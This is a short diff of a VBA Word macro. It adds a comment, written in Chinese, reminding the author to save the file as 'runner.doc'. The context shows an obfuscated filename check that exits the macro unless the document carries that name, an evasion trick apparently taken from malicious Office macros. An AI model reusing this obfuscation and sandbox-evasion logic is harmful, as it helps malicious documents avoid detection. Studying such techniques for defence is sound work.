@@ -23,6 +23,7 @@ Function MyMacro()
     Dim Water As String
     
     ' 利用 PowerShell 脚本加密 Word 文件名 : $payload = "runner.doc"
+    ' 记得保存 Word 文件名为 "runner.doc" !!
     If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
         Exit Function
     End If
